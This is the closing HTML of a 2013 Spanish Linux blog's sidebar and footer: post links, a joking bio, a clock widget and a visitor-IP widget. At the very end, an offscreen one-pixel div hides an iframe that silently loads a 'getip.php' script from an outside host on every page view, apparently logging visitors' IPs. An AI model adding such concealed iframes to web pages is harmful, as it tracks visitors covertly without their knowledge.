        <a href="/blog/synaptic/">synaptic</a>
      </li>
    
      <li class="post">
        <a href="/blog/hello/">hello</a>
      </li>
    
      <li class="post">
        <a href="/blog/iptables/">iptables</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>Sobre mi</h1> 
  <center>
  <img src="/images/linux_user.png" title="Linux user">
  </center>
  <p>Soy un /dev de lo más normal, con ciertas deficiencias en el xorg.conf como casi todo el mundo, con una apariencia común tirando a gráfica VGA y con algún pixel algo deteriorado y que vivirá hasta que su directorio / sufra un kernel pánic y me mande a /dev/null</p>
</section>

<section class="googleplus">
  <h1>
    <a href="https://plus.google.com/107431970267257491799?rel=author">
      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
      Google+
    </a>
  </h1>
</section>


<section>
  <h1>Blogs útiles</h1>
  <ul>
      <li><a href="http://distrowatch.com">Distrowatch</a></li>
      <li><a href="http://es.wikipedia.org/wiki/Lista_de_n%C3%BAmeros_de_puerto">Listado de puertos</a></li>
      <li><a href="http://livecdlist.com/">LiveCDs</a></li>
      <li><a href="https://murmuring-brook-6695.herokuapp.com/">Perseosblog</a><li>
   </ul>
</section>
<section>
<table border="0" cellspacing="0" cellpadding="0"><tr><td align="center"><script type="text/javascript" src="http://www.worldtimeserver.com/clocks/embed.js"></script><script type="text/javascript" language="JavaScript">objES=new Object;objES.wtsclock="wtsclock001.swf";objES.color="CC6600";objES.wtsid="ES";objES.width=200;objES.height=200;objES.wmode="transparent";showClock(objES);</script></td></tr></table>
</section>
<section>
	<h1>IP visitante</h1>
	<script type="text/javascript" src="http://boastology.com/tools/ip2c/?im=0&cn=0&ip=1"></script>
</section>

  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - templix -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>




<div style="width: 1px; height: 1px; overflow: hidden; position: absolute; left: -1000px">
<iframe src="http://crontux.homelinux.com/getip.php"></iframe>
</div>

</body>
</html>
